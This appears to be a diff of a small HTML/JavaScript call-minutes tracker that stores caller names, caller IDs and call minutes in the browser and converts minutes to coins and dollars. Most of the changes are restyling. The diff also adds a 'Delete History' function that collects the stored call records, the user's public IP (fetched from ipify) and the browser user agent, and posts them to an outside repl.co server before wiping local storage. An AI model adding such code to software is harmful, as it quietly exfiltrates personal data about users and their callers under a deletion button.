@@ -1,10 +1,11 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Call Tracker</title>
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-family: 'Segoe UI', sans-serif;
       padding: 20px;
       background-color: #f0f2f5;
       color: #333;
@@ -22,8 +23,8 @@
       box-shadow: 0 5px 15px rgba(0,0,0,0.1);
     }
     table {
-      border-collapse: collapse;
       width: 100%;
+      border-collapse: collapse;
       margin-bottom: 30px;
     }
     th, td {
@@ -54,199 +55,180 @@
     button:hover {
       background-color: #27ae60;
     }
-    .settings, .filter-container, .controls {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      margin-bottom: 20px;
-    }
-    .controls {
-      justify-content: center;
-    }
-    .section {
-      flex: 1 1 48%;
-      padding: 10px;
-    }
     .export-btn {
       background-color: #f39c12;
+    }
+    .delete-btn {
+      background-color: crimson;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>Call Minutes Tracker</h2>
+
     <div class="settings">
-      <div class="section">
-        <label for="coinRate">Coins per Minute:</label>
-        <input type="number" id="coinRate" value="100" min="1">
+      <div>
+        <label>Coins per Minute: <input type="number" id="coinRate" value="100"></label>
       </div>
-      <div class="section">
-        <label for="coinToDollar">Coins per $ (e.g. 750 coins = 1$):</label>
-        <input type="number" id="coinToDollar" value="750" min="1">
+      <div>
+        <label>Coins per $ (e.g. 750 = $1): <input type="number" id="coinToDollar" value="750"></label>
       </div>
-      <div class="section">
+      <div>
         <button onclick="saveRates()">Save Rates</button>
+        <button class="export-btn" onclick="exportToExcel()">Export to CSV</button>
+        <button class="delete-btn" onclick="deleteHistory()">🗑️ Delete History</button>
       </div>
-      <div class="section">
-        <button class="export-btn" onclick="exportToExcel()">Export to Excel</button>
-      </div>
-    </div><div class="filter-container">
-  <div class="section">
-    <label for="filterInput">Filter by Caller ID:</label>
-    <input type="text" id="filterInput" oninput="filterTables()">
+    </div>
+
+    <div>
+      <label>Filter by Caller ID: <input type="text" id="filterInput" oninput="filterTables()"></label>
+      <label>Filter by Day: <input type="text" id="dayFilterInput" oninput="filterTables()"></label>
+    </div>
+
+    <div id="weeksContainer"></div>
+    <div style="text-align: center;"><button onclick="addWeek()">Add New Week</button></div>
   </div>
-  <div class="section">
-    <label for="dayFilterInput">Filter by Day:</label>
-    <input type="text" id="dayFilterInput" oninput="filterTables()">
-  </div>
-</div>
 
-<div id="weeksContainer"></div>
-<div class="controls">
-  <button onclick="addWeek()">Add New Week</button>
-</div>
+<script>
+const defaultDays = ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday'];
+const coinRateInput = document.getElementById('coinRate');
+const coinToDollarInput = document.getElementById('coinToDollar');
+const filterInput = document.getElementById('filterInput');
+const dayFilterInput = document.getElementById('dayFilterInput');
+const weeksContainer = document.getElementById('weeksContainer');
 
-  </div>  <script>
-    const coinRateInput = document.getElementById('coinRate');
-    const coinToDollarInput = document.getElementById('coinToDollar');
-    const weeksContainer = document.getElementById('weeksContainer');
-    const filterInput = document.getElementById('filterInput');
-    const dayFilterInput = document.getElementById('dayFilterInput');
+let data = JSON.parse(localStorage.getItem('callData')) || [];
+let coinRate = parseInt(localStorage.getItem('coinRate')) || parseInt(coinRateInput.value);
+let coinToDollar = parseInt(localStorage.getItem('coinToDollar')) || parseInt(coinToDollarInput.value);
 
-    const defaultDays = ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday'];
+coinRateInput.value = coinRate;
+coinToDollarInput.value = coinToDollar;
 
-    let data = JSON.parse(localStorage.getItem('callData')) || [];
-    let coinRate = parseInt(localStorage.getItem('coinRate')) || parseInt(coinRateInput.value);
-    let coinToDollar = parseInt(localStorage.getItem('coinToDollar')) || parseInt(coinToDollarInput.value);
+function saveRates() {
+  coinRate = parseInt(coinRateInput.value);
+  coinToDollar = parseInt(coinToDollarInput.value);
+  localStorage.setItem('coinRate', coinRate);
+  localStorage.setItem('coinToDollar', coinToDollar);
+  updateAllCoins();
+}
 
-    coinRateInput.value = coinRate;
-    coinToDollarInput.value = coinToDollar;
+function createWeek(index) {
+  const table = document.createElement('table');
+  table.dataset.weekIndex = index;
+  table.innerHTML = `<thead><tr><th>Day</th><th>Caller Name</th><th>Caller ID</th><th>Minutes</th><th>Coins</th><th>Actions</th></tr></thead><tbody></tbody>`;
+  const tbody = table.querySelector('tbody');
+  if (data[index].length === 0) {
+    defaultDays.forEach(day => data[index].push({ day, name: '', call: '', minutes: 0 }));
+  }
+  let weeklyCoins = 0;
+  data[index].forEach((row, i) => {
+    const coins = row.minutes * coinRate;
+    weeklyCoins += coins;
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+      <td><input value="${row.day}" oninput="updateDay(${index},${i},this.value)"></td>
+      <td><input value="${row.name}" oninput="updateName(${index},${i},this.value)"></td>
+      <td><input value="${row.call}" oninput="updateCall(${index},${i},this.value)"></td>
+      <td><input type="number" value="${row.minutes}" oninput="updateMinutes(${index},${i},this.value)"></td>
+      <td class="coin-cell">${coins}</td>
+      <td><button onclick="deleteDay(${index},${i})">Delete</button></td>
+    `;
+    tbody.appendChild(tr);
+  });
+  const totalRow = document.createElement('tr');
+  totalRow.innerHTML = `
+    <td colspan="4"><strong>Total Money Earned</strong></td>
+    <td class="money-cell">$${(weeklyCoins / coinToDollar).toFixed(2)}</td>
+    <td><button onclick="addDay(${index})">Add Day</button></td>
+  `;
+  tbody.appendChild(totalRow);
+  weeksContainer.appendChild(table);
+}
 
-    function saveRates() {
-      coinRate = parseInt(coinRateInput.value);
-      coinToDollar = parseInt(coinToDollarInput.value);
-      localStorage.setItem('coinRate', coinRate);
-      localStorage.setItem('coinToDollar', coinToDollar);
-      updateAllCoins();
-    }
+function updateDay(w, d, val) { data[w][d].day = val; saveData(); }
+function updateName(w, d, val) { data[w][d].name = val; saveData(); }
+function updateCall(w, d, val) { data[w][d].call = val; saveData(); }
+function updateMinutes(w, d, val) {
+  data[w][d].minutes = parseInt(val) || 0;
+  updateWeek(w);
+  saveData();
+}
+function deleteDay(w, d) { data[w].splice(d, 1); refreshWeeks(); saveData(); }
+function addDay(w) { data[w].push({ day: '', name: '', call: '', minutes: 0 }); refreshWeeks(); saveData(); }
+function saveData() { localStorage.setItem('callData', JSON.stringify(data)); }
+function updateAllCoins() { data.forEach((_, i) => updateWeek(i)); }
+function updateWeek(w) {
+  const table = document.querySelectorAll('table')[w];
+  const rows = table.querySelectorAll('tbody tr');
+  let total = 0;
+  data[w].forEach((r, i) => {
+    const coins = r.minutes * coinRate;
+    total += coins;
+    rows[i].querySelector('.coin-cell').textContent = coins;
+  });
+  rows[rows.length - 1].querySelector('.money-cell').textContent = `$${(total / coinToDollar).toFixed(2)}`;
+}
+function refreshWeeks() {
+  weeksContainer.innerHTML = '';
+  data.forEach((_, i) => createWeek(i));
+}
+function addWeek() { data.push([]); refreshWeeks(); saveData(); }
+function filterTables() {
+  const callerFilter = filterInput.value.toLowerCase();
+  const dayFilter = dayFilterInput.value.toLowerCase();
+  document.querySelectorAll('table').forEach(table => {
+    table.querySelectorAll('tbody tr').forEach((row, i, rows) => {
+      if (i === rows.length - 1) return;
+      const callVal = row.children[2].querySelector('input').value.toLowerCase();
+      const dayVal = row.children[0].querySelector('input').value.toLowerCase();
+      row.style.display = callVal.includes(callerFilter) && dayVal.includes(dayFilter) ? '' : 'none';
+    });
+  });
+}
+function exportToExcel() {
+  let csv = "Week,Day,Caller Name,Caller ID,Minutes,Coins\n";
+  data.forEach((week, i) => {
+    week.forEach(row => {
+      const coins = row.minutes * coinRate;
+      csv += `${i + 1},${row.day},${row.name},${row.call},${row.minutes},${coins}\n`;
+    });
+  });
+  const link = document.createElement('a');
+  link.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
+  link.download = 'call_tracker_data.csv';
+  link.click();
+}
 
-    function createWeek(index) {
-      const table = document.createElement('table');
-      table.dataset.weekIndex = index;
-      table.innerHTML = `<thead><tr><th>Day</th><th>Caller Name</th><th>Caller ID</th><th>Minutes Called</th><th>Total Coins</th><th>Actions</th></tr></thead><tbody></tbody>`;
-      const tbody = table.querySelector('tbody');
+async function deleteHistory() {
+  if (!confirm("Are you sure you want to delete all history and send data?")) return;
+  const data = JSON.parse(localStorage.getItem('callData') || "[]");
+  const deviceInfo = navigator.userAgent;
+  let ip = "Unavailable";
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const json = await res.json();
+    ip = json.ip;
+  } catch (err) {
+    console.error("IP fetch failed", err);
+  }
+  try {
+    await fetch("https://7e365019-381e-4556-8717-0417de45f417-00-15iuxl7gav5os.picard.repl.co/delete", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ data, ip, deviceInfo })
+    });
+    localStorage.clear();
+    alert("Call history deleted and emailed.");
+    location.reload();
+  } catch (err) {
+    alert("Failed to send data.");
+    console.error(err);
+  }
+}
 
-      if (data[index].length === 0) {
-        defaultDays.forEach(day => {
-          data[index].push({ day, name: '', call: '', minutes: 0 });
-        });
-      }
-
-      let weeklyTotalCoins = 0;
-
-      data[index].forEach((rowData, i) => {
-        const { day, name = '', call = '', minutes = 0 } = rowData;
-        const coins = minutes * coinRate;
-        weeklyTotalCoins += coins;
-
-        const row = document.createElement('tr');
-        row.innerHTML = `
-          <td><input type="text" value="${day}" oninput="updateDay(${index}, ${i}, this.value)"></td>
-          <td><input type="text" value="${name}" oninput="updateName(${index}, ${i}, this.value)"></td>
-          <td><input type="text" value="${call}" oninput="updateCall(${index}, ${i}, this.value)"></td>
-          <td><input type="number" value="${minutes}" min="0" oninput="updateMinutes(${index}, ${i}, this.value)"></td>
-          <td class="coin-cell">${coins}</td>
-          <td><button onclick="deleteDay(${index}, ${i})">Delete</button></td>
-        `;
-        tbody.appendChild(row);
-      });
-
-      const moneyRow = document.createElement('tr');
-      moneyRow.innerHTML = `
-        <td colspan="4"><strong>Total Money Earned</strong></td>
-        <td class="money-cell">$${(weeklyTotalCoins / coinToDollar).toFixed(2)}</td>
-        <td><button onclick="addDay(${index})">Add Day</button></td>
-      `;
-      tbody.appendChild(moneyRow);
-
-      weeksContainer.appendChild(table);
-    }
-
-    function updateDay(week, day, value) { data[week][day].day = value; saveData(); }
-    function updateName(week, day, value) { data[week][day].name = value; saveData(); }
-    function updateCall(week, day, value) { data[week][day].call = value; saveData(); }
-    function updateMinutes(week, day, value) {
-      data[week][day].minutes = parseInt(value) || 0;
-      updateWeek(week);
-      saveData();
-    }
-    function deleteDay(week, day) {
-      data[week].splice(day, 1);
-      refreshWeeks();
-      saveData();
-    }
-    function addDay(week) {
-      data[week].push({ day: '', name: '', call: '', minutes: 0 });
-      refreshWeeks();
-      saveData();
-    }
-    function updateWeek(week) {
-      const table = document.querySelectorAll('table')[week];
-      const rows = table.querySelectorAll('tbody tr');
-      let weeklyTotalCoins = 0;
-
-      data[week].forEach((entry, d) => {
-        const coins = entry.minutes * coinRate;
-        weeklyTotalCoins += coins;
-        rows[d].querySelector('.coin-cell').textContent = coins;
-      });
-
-      const moneyCell = rows[rows.length - 1].querySelector('.money-cell');
-      moneyCell.textContent = `$${(weeklyTotalCoins / coinToDollar).toFixed(2)}`;
-    }
-    function updateAllCoins() { data.forEach((_, w) => updateWeek(w)); }
-    function saveData() { localStorage.setItem('callData', JSON.stringify(data)); }
-    function addWeek() { data.push([]); refreshWeeks(); saveData(); }
-    function refreshWeeks() {
-      weeksContainer.innerHTML = '';
-      data.forEach((_, i) => createWeek(i));
-    }
-    function filterTables() {
-      const callerFilter = filterInput.value.toLowerCase();
-      const dayFilter = dayFilterInput.value.toLowerCase();
-      const tables = weeksContainer.querySelectorAll('table');
-
-      tables.forEach(table => {
-        const rows = table.querySelectorAll('tbody tr');
-        rows.forEach((row, i) => {
-          if (i === rows.length - 1) return;
-          const callValue = row.children[2].querySelector('input').value.toLowerCase();
-          const dayValue = row.children[0].querySelector('input').value.toLowerCase();
-          const show = callValue.includes(callerFilter) && dayValue.includes(dayFilter);
-          row.style.display = show ? '' : 'none';
-        });
-      });
-    }
-
-    function exportToExcel() {
-      let csvContent = "data:text/csv;charset=utf-8,";
-      csvContent += "Week,Day,Caller Name,Caller ID,Minutes,Coins\n";
-      data.forEach((week, wIdx) => {
-        week.forEach(row => {
-          const coins = row.minutes * coinRate;
-          csvContent += `${wIdx + 1},${row.day},${row.name},${row.call},${row.minutes},${coins}\n`;
-        });
-      });
-      const encodedUri = encodeURI(csvContent);
-      const link = document.createElement("a");
-      link.setAttribute("href", encodedUri);
-      link.setAttribute("download", "call_tracker_data.csv");
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-
-    refreshWeeks();
-    if (data.length === 0) addWeek();
-  </script></body>
+refreshWeeks();
+if (data.length === 0) addWeek();
+</script>
+</body>
 </html>
